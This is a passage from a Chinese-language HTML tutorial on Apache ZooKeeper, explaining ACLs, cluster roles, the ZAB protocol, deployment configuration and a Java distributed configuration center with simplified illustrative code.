<li>确保客户端主动关注重要变化</li>
</ul>
</li>
<li>
<p><strong>轻量级设计</strong>：</p>
<ul>
<li>服务端不存储完整的监听器信息</li>
<li>基于会话的临时注册</li>
<li>支持大规模客户端连接</li>
</ul>
</li>
<li>
<p><strong>有序通知</strong>：</p>
<ul>
<li>保证事件通知的顺序性与发生顺序一致</li>
<li>避免竞态条件和数据不一致</li>
</ul>
</li>
<li>
<p><strong>会话一致性</strong>：</p>
<ul>
<li>Watcher 与创建它的会话绑定</li>
<li>会话过期后所有相关 Watcher 自动清理</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">2.5 访问控制列表（ACL）深度解析</h3>
<p>ZooKeeper 提供细粒度的访问控制，保护数据安全。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ACLExample</span> {
    <span class="hljs-comment">// 创建自定义ACL</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSecureNode</span><span class="hljs-params">(String path, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 定义ACL列表</span>
        List&lt;ACL&gt; acls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 添加digest认证</span>
        <span class="hljs-type">Id</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"user1:password1"</span>);
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ | ZooDefs.Perms.WRITE, user1));
        
        <span class="hljs-comment">// 添加IP限制</span>
        <span class="hljs-type">Id</span> <span class="hljs-variable">ipRestriction</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"ip"</span>, <span class="hljs-string">"192.168.1.100"</span>);
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ, ipRestriction));
        
        zk.create(path, data, acls, CreateMode.PERSISTENT);
    }
    
    <span class="hljs-comment">// 认证示例</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">authenticate</span><span class="hljs-params">()</span> {
        zk.addAuthInfo(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"user1:password1"</span>.getBytes());
    }
}
</code></pre>
<p><strong>ACL 权限类型</strong>：</p>
<ul>
<li><strong>CREATE</strong>：创建子节点权限</li>
<li><strong>READ</strong>：读取节点数据和子节点列表权限</li>
<li><strong>WRITE</strong>：设置节点数据权限</li>
<li><strong>DELETE</strong>：删除子节点权限</li>
<li><strong>ADMIN</strong>：设置ACL权限</li>
</ul>
<h2 data-id="heading-20">3. ZooKeeper 集群架构深度解析</h2>
<h3 data-id="heading-21">3.1 集群角色详细职责</h3>
<h4 data-id="heading-22">3.1.1 Leader 核心职责</h4>
<p>Leader 是 ZooKeeper 集群的核心，负责所有写操作和集群协调。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant C as Client
    participant L as Leader
    participant F1 as Follower1
    participant F2 as Follower2
    participant F3 as Follower3
    
    Note over L: 写请求两阶段提交过程
    
    C-&gt;&gt;L: 写请求(setData /create)
    Note over L: 阶段1: 提案广播
    L-&gt;&gt;L: 生成Zxid (0x100000005)
    L-&gt;&gt;F1: PROPOSAL(zxid, data)
    L-&gt;&gt;F2: PROPOSAL(zxid, data)
    L-&gt;&gt;F3: PROPOSAL(zxid, data)
    
    Note over F1,F3: 阶段1: 确认提案
    F1-&gt;&gt;L: ACK(zxid)
    F2-&gt;&gt;L: ACK(zxid)
    F3-&gt;&gt;L: ACK(zxid)
    
    Note over L: 收到半数以上ACK&lt;br/&gt;开始提交
    
    Note over L: 阶段2: 提交广播
    L-&gt;&gt;F1: COMMIT(zxid)
    L-&gt;&gt;F2: COMMIT(zxid)
    L-&gt;&gt;F3: COMMIT(zxid)
    L-&gt;&gt;L: 应用事务到本地
    
    L-&gt;&gt;C: 写成功响应
    
    Note over F1,F3: 应用事务到本地存储
</code></pre>
<p><strong>Leader 具体职责</strong>：</p>
<ol>
<li>
<p><strong>事务请求处理</strong>：</p>
<ul>
<li>接收并验证所有写请求</li>
<li>为每个事务分配全局唯一的 Zxid</li>
<li>保证事务的原子性和顺序性</li>
</ul>
</li>
<li>
<p><strong>提案广播</strong>：</p>
<ul>
<li>将写请求转化为事务提案</li>
<li>向所有 Follower 广播提案</li>
<li>收集 Follower 的确认响应</li>
</ul>
</li>
<li>
<p><strong>事务提交</strong>：</p>
<ul>
<li>在收到半数以上确认后提交事务</li>
<li>通知所有参与者提交事务</li>
<li>维护事务日志和快照</li>
</ul>
</li>
<li>
<p><strong>集群管理</strong>：</p>
<ul>
<li>监控 Follower 状态</li>
<li>处理新服务器加入</li>
<li>维护集群元数据</li>
</ul>
</li>
</ol>
<h4 data-id="heading-23">3.1.2 Follower 核心职责</h4>
<p>Follower 处理读请求并参与写操作的共识过程。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FollowerResponsibilities</span> {
    <span class="hljs-keyword">private</span> ZooKeeperServer zkServer;
    
    <span class="hljs-comment">// 处理读请求 - 直接从本地内存响应</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReadRequest</span><span class="hljs-params">(Request request)</span> {
        <span class="hljs-comment">// 读操作不需要共识，直接返回本地数据</span>
        <span class="hljs-comment">// 这提供了高性能的读操作</span>
        <span class="hljs-type">byte</span>[] data = zkServer.getData(request.getPath());
        sendResponse(request, data);
    }
    
    <span class="hljs-comment">// 处理写请求 - 转发给Leader</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleWriteRequest</span><span class="hljs-params">(Request request)</span> {
        <span class="hljs-comment">// 写操作必须由Leader处理</span>
        forwardToLeader(request);
    }
    
    <span class="hljs-comment">// 参与Leader选举</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">participateInElection</span><span class="hljs-params">(Vote currentVote)</span> {
        <span class="hljs-comment">// 与其他服务器交换投票信息</span>
        <span class="hljs-comment">// 根据(Zxid, serverId)规则投票</span>
        <span class="hljs-type">Vote</span> <span class="hljs-variable">newVote</span> <span class="hljs-operator">=</span> decideVote(currentVote, receivedVotes);
        broadcastVote(newVote);
    }
    
    <span class="hljs-comment">// 与Leader同步数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncWithLeader</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 接收Leader的PROPOSAL消息</span>
        <span class="hljs-comment">// 验证并记录事务日志</span>
        <span class="hljs-comment">// 在收到COMMIT后应用事务</span>
    }
}
</code></pre>
<h4 data-id="heading-24">3.1.3 Observer 特殊角色</h4>
<p>Observer 用于扩展读性能而不影响写性能。</p>
<p><strong>设计价值</strong>：</p>
<ul>
<li><strong>读扩展性</strong>：分担 Follower 的读请求压力</li>
<li><strong>写性能保护</strong>：不参与投票，避免选举和写操作的性能瓶颈</li>
<li><strong>网络优化</strong>：可以在不同机房部署，提供就近读取</li>
</ul>
<p><strong>配置示例</strong>：</p>
<pre><code class="hljs language-properties" lang="properties"># 在 zoo.cfg 中标识 Observer
peerType=observer

# 在集群配置中标记特定服务器为 Observer
server.1=zk1:2888:3888
server.2=zk2:2888:3888  
server.3=zk3:2888:3888
server.4=zk4:2888:3888:observer  # 标记为Observer
server.5=zk5:2888:3888:observer  # 标记为Observer
</code></pre>
<h3 data-id="heading-25">3.2 ZAB 协议深度解析</h3>
<p>ZAB（ZooKeeper Atomic Broadcast）协议是 ZooKeeper 实现数据一致性的核心算法。</p>
<h4 data-id="heading-26">3.2.1 Zxid 结构详解</h4>
<p>Zxid 是 64 位的全局事务ID，结构如下：</p>
<pre><code class="hljs language-scss" lang="scss">Zxid (<span class="hljs-number">64</span>位)
┌────────────────────────────────┬────────────────────────────────┐
│           Epoch (<span class="hljs-number">32</span>位)         │          Counter (<span class="hljs-number">32</span>位)        │
└────────────────────────────────┴────────────────────────────────┘
</code></pre>
<p><strong>组成部分</strong>：</p>
<ul>
<li><strong>Epoch</strong>：Leader 任期编号，每次新 Leader 选举时递增</li>
<li><strong>Counter</strong>：事务计数器，每个新事务递增，从0开始</li>
</ul>
<p><strong>示例序列</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">0x0000000100000000  <span class="hljs-comment"># Epoch=1, Counter=0 (初始状态)</span>
0x0000000100000001  <span class="hljs-comment"># Epoch=1, Counter=1 (第一个事务)</span>
0x0000000100000002  <span class="hljs-comment"># Epoch=1, Counter=2 (第二个事务)</span>
0x0000000200000000  <span class="hljs-comment"># Epoch=2, Counter=0 (新Leader选举)</span>
0x0000000200000001  <span class="hljs-comment"># Epoch=2, Counter=1 (新任期第一个事务)</span>
</code></pre>
<h4 data-id="heading-27">3.2.2 ZAB 协议四个阶段详细流程</h4>
<p><strong>阶段一：选举阶段（Leader Election）</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Start[服务器启动/Leader失效] --&gt; Looking[进入LOOKING状态]
    Looking --&gt; Broadcast[广播投票信息]
    
    subgraph 投票信息内容
        Broadcast --&gt; VoteContent[包含: sid, zxid, epoch]
    end
    
    Broadcast --&gt; Receive[接收其他服务器投票]
    Receive --&gt; Compare{比较投票优先级}
    
    Compare --&gt; |对方优先级更高| Update[更新自己的投票]
    Compare --&gt; |自己优先级更高| Keep[保持自己的投票]
    Compare --&gt; |优先级相同| CompareSid[比较服务器ID]
    
    Update --&gt; Collect[收集投票]
    Keep --&gt; Collect
    CompareSid --&gt; |对方SID更大| Update
    CompareSid --&gt; |自己SID更大| Keep
    
    Collect --&gt; Check{收到多数派投票?}
    Check --&gt; |是| Leader[成为准Leader]
    Check --&gt; |否| Continue[继续选举过程]
    
    Leader --&gt; Discovery[进入发现阶段]
    Continue --&gt; Broadcast
</code></pre>
<p><strong>选举算法规则</strong>：</p>
<ol>
<li><strong>比较 Epoch</strong>：Epoch 大的优先级更高</li>
<li><strong>比较 Zxid</strong>：Epoch 相同时，Zxid 大的优先级更高</li>
<li><strong>比较 Server ID</strong>：Zxid 相同时，Server ID 大的优先级更高</li>
</ol>
<p><strong>阶段二：发现阶段（Discovery）</strong></p>
<p>发现阶段的主要目标是同步集群状态，确保数据一致性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiscoveryPhase</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(QuorumPeer self)</span> {
        <span class="hljs-comment">// 1. 收集Follower的lastZxid</span>
        Map&lt;Long, Long&gt; followerLastZxids = collectFollowerLastZxids();
        
        <span class="hljs-comment">// 2. 确定同步点</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">syncPoint</span> <span class="hljs-operator">=</span> calculateSyncPoint(followerLastZxids);
        
        <span class="hljs-comment">// 3. 发送NEWLEADER包</span>
        <span class="hljs-type">NewLeaderPacket</span> <span class="hljs-variable">newLeaderPacket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewLeaderPacket</span>(
            self.getId(), 
            self.getCurrentEpoch(), 
            syncPoint
        );
        broadcastToFollowers(newLeaderPacket);
        
        <span class="hljs-comment">// 4. 等待ACK确认</span>
        waitForAckFromQuorum();
        
        <span class="hljs-comment">// 5. 更新集群状态</span>
        self.setCurrentEpoch(self.getCurrentEpoch() + <span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>阶段三：同步阶段（Synchronization）</strong></p>
<p>同步阶段确保所有服务器具有相同的数据状态。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizationPhase</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizeFollowers</span><span class="hljs-params">(<span class="hljs-type">long</span> syncPoint)</span> {
        <span class="hljs-comment">// 1. 获取需要同步的事务</span>
        List&lt;Proposal&gt; transactionsToSync = 
            transactionLog.getTransactionsAfter(syncPoint);
        
        <span class="hljs-comment">// 2. 按顺序发送事务给Follower</span>
        <span class="hljs-keyword">for</span> (Proposal proposal : transactionsToSync) {
            sendProposalToFollowers(proposal);
            waitForAckFromQuorum();
            sendCommitToFollowers(proposal);
        }
        
        <span class="hljs-comment">// 3. 验证同步完成</span>
        validateSynchronization();
    }
}
</code></pre>
<p><strong>阶段四：广播阶段（Broadcast）</strong></p>
<p>广播阶段是 ZAB 协议的正常工作模式，处理客户端请求。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BroadcastPhase</span> {
    <span class="hljs-comment">// 两阶段提交处理写请求</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWriteRequest</span><span class="hljs-params">(WriteRequest request)</span> {
        <span class="hljs-comment">// 阶段1：提案</span>
        <span class="hljs-type">Proposal</span> <span class="hljs-variable">proposal</span> <span class="hljs-operator">=</span> createProposal(request);
        broadcastProposal(proposal);
        
        <span class="hljs-comment">// 等待ACK</span>
        <span class="hljs-keyword">if</span> (receiveAckFromQuorum()) {
            <span class="hljs-comment">// 阶段2：提交</span>
            broadcastCommit(proposal);
            applyToLocal(proposal);
            sendResponseToClient(request, SUCCESS);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 提交失败</span>
            sendResponseToClient(request, FAILURE);
        }
    }
    
    <span class="hljs-comment">// 处理读请求 - 直接返回本地数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processReadRequest</span><span class="hljs-params">(ReadRequest request)</span> {
        <span class="hljs-comment">// 读操作不需要共识，直接返回</span>
        <span class="hljs-type">byte</span>[] data = getLocalData(request.getPath());
        sendResponseToClient(request, data);
    }
}
</code></pre>
<h3 data-id="heading-28">3.3 ZAB Java 实现的优化</h3>
<p>在实际的 Java 实现中，ZAB 协议进行了优化：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastLeaderElection</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ElectionProtocol</span> {
    <span class="hljs-comment">// 快速领导者选举算法</span>
    <span class="hljs-keyword">public</span> Vote <span class="hljs-title function_">lookForLeader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// 1. 自增逻辑时钟</span>
        logicalclock.incrementAndGet();
        
        <span class="hljs-comment">// 2. 初始化投票给自己</span>
        <span class="hljs-type">Vote</span> <span class="hljs-variable">currentVote</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vote</span>(myid, getLastLoggedZxid());
        
        <span class="hljs-comment">// 3. 广播投票</span>
        sendNotifications();
        
        <span class="hljs-comment">// 4. 收集投票并决策</span>
        <span class="hljs-keyword">while</span> (!haveQuorum(currentVote)) {
            <span class="hljs-type">Notification</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> receiveQueue.poll(timeout, TimeUnit.MILLISECONDS);
            <span class="hljs-keyword">if</span> (n == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;
            
            <span class="hljs-comment">// 根据规则更新投票</span>
            currentVote = updateVote(currentVote, n);
        }
        
        <span class="hljs-keyword">return</span> currentVote;
    }
}
</code></pre>
<p><strong>优化要点</strong>：</p>
<ol>
<li><strong>快速选举</strong>：减少选举时间，提高系统可用性</li>
<li><strong>阶段合并</strong>：发现阶段和同步阶段合并为恢复阶段</li>
<li><strong>异步处理</strong>：使用队列和线程池提高并发性能</li>
</ol>
<h3 data-id="heading-29">3.4 集群部署最佳实践</h3>
<h4 data-id="heading-30">3.4.1 服务器数量规划</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClusterPlanning</span> {
    <span class="hljs-comment">/**
     * 计算最优集群规模
     * <span class="hljs-doctag">@param</span> expectedFaultTolerance 期望容错节点数
     * <span class="hljs-doctag">@param</span> readWriteRatio 读写比例
     * <span class="hljs-doctag">@param</span> expectedClients 预期客户端数量
     * <span class="hljs-doctag">@return</span> 推荐的服务器配置
     */</span>
    <span class="hljs-keyword">public</span> ClusterConfig <span class="hljs-title function_">calculateOptimalConfig</span><span class="hljs-params">(<span class="hljs-type">int</span> expectedFaultTolerance, 
                                               <span class="hljs-type">double</span> readWriteRatio,
                                               <span class="hljs-type">int</span> expectedClients)</span> {
        <span class="hljs-comment">// 基础服务器数量：2f + 1</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">baseServers</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * expectedFaultTolerance + <span class="hljs-number">1</span>;
        
        <span class="hljs-comment">// 根据读写比例调整Observer数量</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">observerCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (readWriteRatio &gt; <span class="hljs-number">5</span>) { <span class="hljs-comment">// 读多写少场景</span>
            observerCount = Math.max(<span class="hljs-number">1</span>, expectedClients / <span class="hljs-number">1000</span>);
        }
        
        <span class="hljs-comment">// 总服务器数量</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">totalServers</span> <span class="hljs-operator">=</span> baseServers + observerCount;
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterConfig</span>(baseServers, observerCount, totalServers);
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeploymentExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ClusterPlanning</span> <span class="hljs-variable">planner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterPlanning</span>();
        
        <span class="hljs-comment">// 场景1：容忍1台故障，读写均衡</span>
        <span class="hljs-type">ClusterConfig</span> <span class="hljs-variable">config1</span> <span class="hljs-operator">=</span> planner.calculateOptimalConfig(<span class="hljs-number">1</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">100</span>);
        System.out.println(<span class="hljs-string">"场景1: "</span> + config1); <span class="hljs-comment">// 3台服务器，0个Observer</span>
        
        <span class="hljs-comment">// 场景2：容忍2台故障，读多写少</span>
        <span class="hljs-type">ClusterConfig</span> <span class="hljs-variable">config2</span> <span class="hljs-operator">=</span> planner.calculateOptimalConfig(<span class="hljs-number">2</span>, <span class="hljs-number">10.0</span>, <span class="hljs-number">5000</span>);
        System.out.println(<span class="hljs-string">"场景2: "</span> + config2); <span class="hljs-comment">// 5台服务器 + 5个Observer</span>
    }
}
</code></pre>
<h4 data-id="heading-31">3.4.2 配置文件详解</h4>
<pre><code class="hljs language-properties" lang="properties"># zoo.cfg - 核心配置
tickTime=2000
initLimit=10
syncLimit=5
dataDir=/var/lib/zookeeper
dataLogDir=/var/lib/zookeeper/logs  # 事务日志单独目录，提高性能
clientPort=2181
maxClientCnxns=60

# 自动清理配置
autopurge.snapRetainCount=5
autopurge.purgeInterval=6

# 高级性能配置
preAllocSize=65536      # 预分配文件大小
snapCount=100000        # 多少次事务后做快照
maxSessionTimeout=40000 # 最大会话超时
minSessionTimeout=4000  # 最小会话超时

# 集群配置 - 生产环境示例
server.1=zk1.cluster.com:2888:3888
server.2=zk2.cluster.com:2888:3888
server.3=zk3.cluster.com:2888:3888
server.4=zk4.cluster.com:2888:3888:observer  # 读扩展节点
server.5=zk5.cluster.com:2888:3888:observer  # 读扩展节点
</code></pre>
<h4 data-id="heading-32">3.4.3 硬件和网络规划</h4>
<p><strong>硬件建议</strong>：</p>
<ul>
<li><strong>内存</strong>：至少8GB，根据节点数量和数据量调整</li>
<li><strong>磁盘</strong>：SSD硬盘，独立磁盘用于事务日志</li>
<li><strong>CPU</strong>：多核处理器，ZooKeeper CPU 使用通常不高</li>
<li><strong>网络</strong>：低延迟、高带宽的内部网络</li>
</ul>
<p><strong>部署拓扑</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "主数据中心"
        Client1[客户端] --&gt; LB[负载均衡器]
        LB --&gt; ZK1[ZooKeeper1 Leader]
        LB --&gt; ZK2[ZooKeeper2 Follower]
        LB --&gt; ZK3[ZooKeeper3 Follower]
    end
    
    subgraph "备用数据中心"
        Client2[客户端] --&gt; LB2[负载均衡器]
        LB2 --&gt; ZK4[ZooKeeper4 Observer]
        LB2 --&gt; ZK5[ZooKeeper5 Observer]
    end
    
    ZK1 -.-&gt; ZK4
    ZK2 -.-&gt; ZK5
    ZK3 -.-&gt; ZK4
</code></pre>
<h2 data-id="heading-33">4. 企业级应用场景深度实现</h2>
<h3 data-id="heading-34">4.1 分布式配置管理中心</h3>
<p>分布式配置管理是 ZooKeeper 最典型的应用场景之一。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedConfigCenter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String configBasePath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, String&gt; localConfigCache;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ConfigListener&gt; listeners;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedConfigCenter</span><span class="hljs-params">(String connectString, String basePath)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-built_in">this</span>.configBasePath = basePath;
        <span class="hljs-built_in">this</span>.localConfigCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 创建ZooKeeper连接</span>
        <span class="hljs-built_in">this</span>.zk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(connectString, <span class="hljs-number">15000</span>, <span class="hljs-built_in">this</span>::processWatchEvent);
        
        <span class="hljs-comment">// 初始化配置</span>
        initializeConfigCenter();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeConfigCenter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保配置根目录存在</span>
        ensurePathExists(configBasePath);
        
        <span class="hljs-comment">// 加载所有现有配置</span>
        loadAllConfigs();
        
        <span class="hljs-comment">// 监听配置变化</span>
        watchConfigChanges();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensurePathExists</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(path, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 递归创建路径</span>
            String[] parts = path.substring(<span class="hljs-number">1</span>).split(<span class="hljs-string">"/"</span>);
            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
            
            <span class="hljs-keyword">for</span> (String part : parts) {
                currentPath.append(<span class="hljs-string">"/"</span>).append(part);
                <span class="hljs-keyword">if</span> (zk.exists(currentPath.toString(), <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
                    zk.create(currentPath.toString(), 
                             <span class="hljs-literal">null</span>, 
                             ZooDefs.Ids.OPEN_ACL_UNSAFE, 
                             CreateMode.PERSISTENT);
                }
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadAllConfigs</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        List&lt;String&gt; configNodes = zk.getChildren(configBasePath, <span class="hljs-literal">false</span>);
        
        <span class="hljs-keyword">for</span> (String configNode : configNodes) {
            <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + configNode;
            <span class="hljs-type">byte</span>[] data = zk.getData(configPath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
            <span class="hljs-type">String</span> <span class="hljs-variable">configValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data, StandardCharsets.UTF_8);
            
            localConfigCache.put(configNode, configValue);
            System.out.println(<span class="hljs-string">"加载配置: "</span> + configNode + <span class="hljs-string">" = "</span> + configValue);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watchConfigChanges</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 监听配置目录的子节点变化</span>
        zk.getChildren(configBasePath, event -&gt; {
            <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeChildrenChanged) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// 重新加载所有配置</span>
                    loadAllConfigs();
                    notifyListeners();
                    
                    <span class="hljs-comment">// 重新注册监听</span>
                    watchConfigChanges();
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        
        <span class="hljs-comment">// 监听每个配置节点的数据变化</span>
        <span class="hljs-keyword">for</span> (String configNode : localConfigCache.keySet()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + configNode;
            zk.getData(configPath, event -&gt; {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeDataChanged) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-type">byte</span>[] newData = zk.getData(configPath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
                        <span class="hljs-type">String</span> <span class="hljs-variable">newValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(newData, StandardCharsets.UTF_8);
                        
                        localConfigCache.put(configNode, newValue);
                        System.out.println(<span class="hljs-string">"配置更新: "</span> + configNode + <span class="hljs-string">" = "</span> + newValue);
                        
                        notifyListeners();
                        
                        <span class="hljs-comment">// 重新注册监听</span>
                        zk.getData(configPath, <span class="hljs-built_in">this</span>::processWatchEvent, <span class="hljs-literal">null</span>);
                    } <span class="hljs-keyword">catch</span> (Exception e) {
                        e.printStackTrace();
                    }
                }
            }, <span class="hljs-literal">null</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> localConfigCache.get(key);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConfig</span><span class="hljs-params">(String key, String value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + key;
        
        <span class="hljs-keyword">if</span> (zk.exists(configPath, <span class="hljs-literal">false</span>) != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 更新现有配置</span>
            zk.setData(configPath, value.getBytes(StandardCharsets.UTF_8), -<span class="hljs-number">1</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 创建新配置</span>
            zk.create(configPath, 
                     value.getBytes(StandardCharsets.UTF_8),
                     ZooDefs.Ids.OPEN_ACL_UNSAFE,
                     CreateMode.PERSISTENT);
        }
        
        localConfigCache.put(key, value);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addConfigListener</span><span class="hljs-params">(ConfigListener listener)</span> {
        listeners.add(listener);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyListeners</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (ConfigListener listener : listeners) {
            listener.onConfigChanged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(localConfigCache));
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfigListener</span> {
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onConfigChanged</span><span class="hljs-params">(Map&lt;String, String&gt; newConfig)</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWatchEvent</span><span class="hljs-params">(WatchedEvent event)</span> {
        <span class="hljs-comment">// 处理会话事件</span>
        <span class="hljs-keyword">if</span> (event.getType() == EventType.None) {
            <span class="hljs-keyword">switch</span> (event.getState()) {
                <span class="hljs-keyword">case</span> Expired:
                    System.out.println(<span class="hljs-string">"会话过期，需要重新连接"</span>);
